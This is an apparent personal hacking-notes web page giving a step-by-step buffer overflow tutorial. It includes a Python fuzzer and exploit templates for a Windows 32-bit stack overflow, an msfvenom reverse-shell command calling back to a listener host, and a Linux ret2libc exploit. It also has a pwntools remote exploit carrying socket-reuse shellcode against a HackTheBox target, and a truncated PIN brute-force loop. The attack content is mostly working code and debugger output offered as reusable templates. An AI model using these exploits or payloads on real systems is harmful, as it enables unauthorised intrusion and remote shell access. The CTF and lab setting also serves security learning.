<!DOCTYPE html>

<html>
	<head>
		<meta charset="utf-8">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Buffer Overflow | Hacking Notes</title>
<meta name="generator" content="Jekyll v3.8.4" />
<meta property="og:title" content="Buffer Overflow" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Windows 32 bits" />
<meta property="og:description" content="Windows 32 bits" />
<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/exploiting/buffer-overflow/" />
<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/exploiting/buffer-overflow/" />
<meta property="og:site_name" content="Hacking Notes" />
<script type="application/ld+json">
{"description":"Windows 32 bits","url":"http://0.0.0.0:4000/hackingnotes/exploiting/buffer-overflow/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Buffer Overflow","@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />

		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
		<link rel="stylesheet" href="/hackingnotes/css/main.css">
		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">

		
	</head>

	<body>
		<header>
			<h1>
				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
				Hacking Notes
				<button type="button" class="open-nav" id="open-nav"></button>
			</h1>

			<form action="/hackingnotes/search/" method="get">
				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
				<input type="submit" value="Search" style="display: none;">
			</form>

			<nav class="full-navigation">
				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/">What is this?</a>
					</li>
				</ul>

				<ul>
					
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level current">
							
							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
							<ul>
								
									<li class="nav-item current"><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/other/hacking-aws/">Other</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/services/ftp/">Services</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/software/wordpress/">Software</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
								
							</ul>
						</li>
					
						<li class="nav-item top-level ">
							
							<a href="/hackingnotes/web/file-inclusion/">Web</a>
							<ul>
								
									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
								
									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
								
							</ul>
						</li>
					
				</ul>

				<ul>
					<li class="nav-item top-level ">
						
						<a href="/hackingnotes/changelog/">Change Log</a>
					</li>
				</ul>
			</nav>
		</header>

		<section class="main">
			<div class="page-header">
				<h2>Exploiting</h2>
				<h3>Buffer Overflow</h3>
			</div>
			<article class="content">
				<h1 id="windows-32-bits">Windows 32 bits</h1>

<h2 id="stack-based">Stack-Based</h2>

<p>For that task we are going to use a Windows 7 x64 with Immunity Debugger and mona.py installed.</p>

<h3 id="mona-configuration">Mona configuration</h3>

<p><code class="highlighter-rouge">!mona config -set workingfolder c:\mona\%p</code></p>

<h3 id="fuzz-to-find-the-vulnerable-input">Fuzz to find the vulnerable input</h3>

<p>fuzzer.py</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket, time, sys

ip = "10.10.95.202"
port = 1337
timeout = 5

buffer = []
counter = 100
while len(buffer) &lt; 30:
    buffer.append("A" * counter)
    counter += 100

for string in buffer:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        connect = s.connect((ip, port))
        s.recv(1024)
        print("Fuzzing with %s bytes" % len(string))
        s.send("OVERFLOW1 " + string + "\r\n")
        s.recv(1024)
        s.close()
    except:
        print("Could not connect to " + ip + ":" + str(port))
        sys.exit(0)
    time.sleep(1)
</code></pre></div></div>

<h3 id="crash-replication--crontrolling-eip">Crash Replication &amp; Crontrolling EIP</h3>

<p>exploit.py</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import socket

ip = "10.10.95.202"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
</code></pre></div></div>

<p>create a pattern: <code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600</code></p>

<p>And add the output to a payload variable and exploited.</p>

<p>take notes about the EIP and search the offset:</p>

<p><code class="highlighter-rouge">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP</code></p>

<p>Check adding <code class="highlighter-rouge">BBBB</code> value to <code class="highlighter-rouge">retn</code> variable.</p>

<h3 id="finding-bad-characters">Finding Bad Characters</h3>

<p>Find the characters that are not accepted on the payload. (REMEMBER FILL THE EIP)</p>

<p><code class="highlighter-rouge">!mona bytearray -b "\x00"</code></p>

<p>And add the output to the payload variable (without the offset)</p>

<p>Finally compare the binary file with the stack frame specifying the ESP.</p>

<p><code class="highlighter-rouge">!mona compare -f C:\mona\oscp\bytearray.bin -a &lt;ESP&gt;</code></p>

<p>Repeat the process adding the new bad characters found until the results status returns <strong>UNMODIFIED</strong></p>

<p><code class="highlighter-rouge">!mona bytearray -b "\x00\x07\x2e\xa0"</code></p>

<blockquote>
  <p><strong>Note</strong>: If the ESP direction does not match with the beginning of the payload fill it with NOPS (normally is <strong>“\x90”*8</strong>)</p>
</blockquote>

<h3 id="finding-a-jump-point">Finding a Jump Point</h3>

<p>Find all “jmp esp” on the system <code class="highlighter-rouge">!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"</code></p>

<blockquote>
  <p><strong>Remember</strong>: <strong>Don’t Forget</strong> to put the <strong>BAD CHARS</strong> founded.</p>
</blockquote>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
</code></pre></div></div>

<blockquote>
  <p><strong>REMBEMBER LITTLE ENDIAN</strong> <code class="highlighter-rouge">\x62\x50\x11\xAF (system) -&gt; \xAF\x11\x50\x62 (exploit)</code></p>
</blockquote>

<p>Put the adress on the “retn” variable. If the EIP is the same as ESP you success at jummping to ESP.</p>

<h3 id="generate-the-payload">Generate the Payload</h3>

<p>We will generate the payload with <code class="highlighter-rouge">msfvenom</code>, (DON’T FORGET TO PUT THE FOUND BAD CHARS)<code class="highlighter-rouge"> </code><code class="highlighter-rouge"> </code></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.11.21.203 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f py

| sed 's/buf/payload/g'
</code></pre></div></div>

<blockquote>
  <p><strong>Hint:</strong> Using <strong>EXITFUNC=thread</strong> will only finish the thread once termintad the reverse shell without affecting the whole program. -&gt; NO DoS</p>
</blockquote>

<p>Copy the generated payload ant integrate it into the <code class="highlighter-rouge">exploit.py</code></p>

<h3 id="prepend-nops">Prepend NOPs</h3>

<p>We will need some space in memory for the payload to unpack itself, if we added a padding before to match the beginning of the payload with ESP add another 16 NOPS.</p>

<p><code class="highlighter-rouge">padding = "\x90" * 16</code></p>

<h1 id="linux-32-bits">Linux 32 bits</h1>

<h2 id="ret2libc-localy">Ret2Libc (Localy)</h2>

<p>For that task we are going to use a Kali with <code class="highlighter-rouge">gdb-peda</code> installed:</p>

<h3 id="running-the-binary-with-gdb">Running the binary with GDB</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gdb rop
GNU gdb (Debian 10.1-1.7) 10.1.90.20210103-git
Copyright (C) 2021 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
&lt;https://www.gnu.org/software/gdb/bugs/&gt;.
Find the GDB manual and other documentation resources online at:
    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from rop...
(No debugging symbols found in rop)

gdb-peda$ r "Hello World"
Starting program: /home/mvaliente/KaliShared/ctf/HackTheBox/Frolic/content/rop "Hello World"
[+] Message sent: Hello World[Inferior 1 (process 379963) exited normally]
Warning: not running
gdb-peda$ 
</code></pre></div></div>

<p>Notice that we get a message in GDB telling us that the the process was detached after a fork from the child process. We can fix that by setting the following commands in GDB.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ set follow-fork-mode child
gdb-peda$ set detach-on-fork off
</code></pre></div></div>

<h3 id="finding-the-offset">Finding the offset</h3>

<ul>
  <li><strong>Create the pattern</strong></li>
</ul>

<p>Create a randomized pattern in order to find the offset with the EIP value.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ pattern_create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
</code></pre></div></div>

<ul>
  <li><strong>Find the offset</strong></li>
</ul>

<p>Run the binary with the pattern.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
Starting program: /home/mvaliente/KaliShared/ctf/HackTheBox/Frolic/content/rop 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x79 ('y')
EBX: 0xffffcd20 --&gt; 0x2 
ECX: 0x0 
EDX: 0x5f ('_')
ESI: 0xf7faa000 --&gt; 0x1e4d6c 
EDI: 0xf7faa000 --&gt; 0x1e4d6c 
EBP: 0x31414162 ('bAA1')
ESP: 0xffffccf0 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
EIP: 0x41474141 ('AAGA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41474141
[------------------------------------stack-------------------------------------]
0000| 0xffffccf0 ("AcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0004| 0xffffccf4 ("2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0008| 0xffffccf8 ("AAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0012| 0xffffccfc ("A3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0016| 0xffffcd00 ("IAAeAA4AAJAAfAA5AAKAAgAA6AAL")
0020| 0xffffcd04 ("AA4AAJAAfAA5AAKAAgAA6AAL")
0024| 0xffffcd08 ("AJAAfAA5AAKAAgAA6AAL")
0028| 0xffffcd0c ("fAA5AAKAAgAA6AAL")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41474141 in ?? ()
gdb-peda$ 
</code></pre></div></div>

<blockquote>
  <p><strong>EIP:</strong> 0x41474141 (‘AAGA’)</p>
</blockquote>

<p>Once we have the EIP we will search the offset value with the pattern:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ pattern_offset 0x41474141
1095188801 found at offset: 52
</code></pre></div></div>

<blockquote>
  <p><strong>Offset:</strong> 52</p>
</blockquote>

<ul>
  <li><strong>Check results</strong></li>
</ul>

<p>Now run the binary with a randomized offset and a controlled EIP like ‘BBBB’.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 -c 'print("A"*52 + 'BBBB')'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
</code></pre></div></div>

<p>And finally run the binary with the payload</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Starting program: /home/mvaliente/KaliShared/ctf/HackTheBox/Frolic/content/rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x38 ('8')
EBX: 0xffffcd50 --&gt; 0x2 
ECX: 0x0 
EDX: 0x0 
ESI: 0xf7faa000 --&gt; 0x1e4d6c 
EDI: 0xf7faa000 --&gt; 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffcd20 --&gt; 0xffffd000 ("ared/ctf/HackTheBox/Frolic/content/rop")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242
[------------------------------------stack-------------------------------------]
0000| 0xffffcd20 --&gt; 0xffffd000 ("ared/ctf/HackTheBox/Frolic/content/rop")
0004| 0xffffcd24 --&gt; 0xffffcdf4 --&gt; 0xffffcfea ("/home/mvaliente/KaliShared/ctf/HackTheBox/Frolic/content/rop")
0008| 0xffffcd28 --&gt; 0xffffce00 --&gt; 0xffffd060 ("COLORFGBG=15;0")
0012| 0xffffcd2c --&gt; 0x8048561 (&lt;__libc_csu_init+33&gt;:   lea    eax,[ebx-0xf8])
0016| 0xffffcd30 --&gt; 0xffffcd50 --&gt; 0x2 
0020| 0xffffcd34 --&gt; 0x0 
0024| 0xffffcd38 --&gt; 0x0 
0028| 0xffffcd3c --&gt; 0xf7de3e46 (&lt;__libc_start_main+262&gt;:       add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x42424242 in ?? ()
gdb-peda$ 
</code></pre></div></div>

<blockquote>
  <p><strong>EIP:</strong> 0x42424242 (‘BBBB’) <strong>CORRECT RESULT</strong></p>
</blockquote>

<ul>
  <li><strong>Check Security</strong></li>
</ul>

<p>With <code class="highlighter-rouge">gdb-peda</code> :</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
gdb-peda$ 
</code></pre></div></div>

<p>To check ASLR you can check the following file on the target machine:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /proc/sys/kernel/randomize_va_space
</code></pre></div></div>

<p>Checking the results:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: center">Result</th>
      <th style="text-align: center">ASLR</th>
      <th style="text-align: center">PIE</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: center">0</td>
      <td style="text-align: center">OFF</td>
      <td style="text-align: center">OFF</td>
    </tr>
    <tr>
      <td style="text-align: center">1</td>
      <td style="text-align: center">ON</td>
      <td style="text-align: center">ON</td>
    </tr>
    <tr>
      <td style="text-align: center">2</td>
      <td style="text-align: center">OFF</td>
      <td style="text-align: center">OFF</td>
    </tr>
  </tbody>
</table>

<ul>
  <li><strong>Finding Addresses</strong></li>
</ul>

<h3 id="--libcso6">- libc.so.6</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ldd rop                 
        linux-gate.so.1 =&gt;  (0xb7fda000)
        libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
        /lib/ld-linux.so.2 (0xb7fdb000)
</code></pre></div></div>

<blockquote>
  <p><strong>libc.so.6</strong>: /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)</p>
</blockquote>

<h3 id="--system">- system</h3>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
&lt;/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system            
   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0
</code></pre></div></div>

<blockquote>
  <p><strong>system@@GLIBC_2.0</strong>: 0x0003ada0</p>
</blockquote>

<h4 id="--exit">- exit</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
&lt;/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit              
   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1
  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2
</code></pre></div></div>

<blockquote>
  <p><strong>exit@@GLIBC_2.0</strong>: 0x0002e9d0</p>
</blockquote>

<h4 id="--binsh">- /bin/sh</h4>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
&lt;/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh         
 15ba0b /bin/sh
</code></pre></div></div>

<blockquote>
  <p><strong>/bin/sh:</strong> 0x0015ba0b</p>
</blockquote>

<ul>
  <li><strong>Create the exploit</strong></li>
</ul>

<p>This is a template:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import struct

offset = 52
overflow = "A" * offset

libc = 0xb7e19000

system = struct.pack('&lt;I', libc + 0x0003ada0)
exit = struct.pack('&lt;I', libc + 0x0002e9d0)
binsh = struct.pack('&lt;I', libc + 0x0015ba0b)

payload = overflow + system + exit + binsh
print(payload)
</code></pre></div></div>

<ul>
  <li><strong>Explotation</strong></li>
</ul>

<p>Finally we just need to transfer the file to the target machine and executed</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ./rop $(python /tmp/exploit.py)

# id
uid=0(root) gid=33(www-data) groups=33(www-data)
</code></pre></div></div>

<h3 id="stack-based-remotely">Stack-Based (Remotely)</h3>

<p>Same as <code class="highlighter-rouge">Ret2Libc</code> we need to control the EIP. When we successfuly control the EIP we need to check which security is enabled:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : ENABLED
RELRO     : Partial
</code></pre></div></div>

<p>We can see that PIE is enabled which stands for Position Independent Executable. This means that the memory locations will change every time you run the application. This makes exploiting buffer overflows harder. However, in that example of BoF there was a DEBUG parameter that gave us the location of the buffer overflow-able field.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc 10.10.10.34 7411
OK Ready. Send USER command.
DEBUG
OK DEBUG mode on.
USER admin
OK Send PASS command.
PASS admin
Debug: userpass buffer @ 0xffffd610
Incorrect username and/or password.
ERR Authentication failed.
</code></pre></div></div>

<h4 id="socket-re-use">Socket Re-Use</h4>

<p>Instead of spawning a reverse shell that maybe give problems to us with bad characters we can re-use the open socket.</p>

<p>The following shellcode works to re-use the socket.</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>buf=b""
buf+=b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf+=b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf+=b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf+=b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf+=b"\x89\xe3\x31\xc9\xcd\x80";
</code></pre></div></div>

<ul>
  <li><a href="https://www.exploit-db.com/exploits/34060">https://www.exploit-db.com/exploits/34060</a></li>
</ul>

<h4 id="fitting-the-exploit">Fitting the exploit</h4>

<p>Finally we just need to fit all parts together and make the exploit:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *
# Initial Configuration

context(os="linux", arch="i386")
host = "10.10.10.34"
port = "7411"

# Junk Bytes

junk = b'A' * 28

# UserPass Leaked memory
addr = p32(0xffffd610+32) 

# Payload to reuse the socket
buf=b""
buf+=b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf+=b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf+=b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf+=b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf+=b"\x89\xe3\x31\xc9\xcd\x80";

payload = junk + addr + buf

r = remote(host, port, level='error')
r.recvline()
r.sendline("DEBUG")
r.recvline()
r.sendline("USER admin")
r.recvline()
r.sendline("PASS " + payload)

r.interactive()
</code></pre></div></div>

<h2 id="example-pwntools">Example pwntools</h2>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>from pwn import *

for i in range(0, 9999):
    code = "0" * (4- len(str(i))) + str(i)
    # r = process("./mypapp")
    r = remote("localhost", 910, level='error')
    r.recvuntil("[$] ")
    r.sendline(code)
    response = r.recvline()
    r.close()
